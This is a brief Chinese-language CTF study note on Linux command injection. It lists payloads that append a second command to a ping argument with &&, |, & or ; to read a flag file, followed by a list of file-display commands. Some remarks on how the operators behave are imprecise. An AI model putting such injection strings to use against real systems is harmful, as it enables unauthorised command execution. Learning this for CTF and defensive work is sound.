这道题没法做。。端口出问题了。。不过记住方法吧

类型为命令注入

Linux下的命令注入：

ping 1.1.1.1 && cat flag
#先执行ping后执行cat flag

ping 1.1.1.1 | cat flag
#只执行cat flag

ping 1.1.1.1 & cat flag
#先执行cat flag后执行ping

或者使用分号;一次执行两条语句：

ping 1.1.1.1;cat flag
ping 1.1.1.1;tac flag
...

一些显示文件内容的方法：

cat     由第一行开始显示内容，并将所有内容输出
tac     从最后一行倒序显示内容，并将所有内容输出
more    根据窗口大小，一页一页的显示文件内容
less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head    只显示头几行
tail    只显示最后几行
nl      类似于cat -n，显示时输出行号
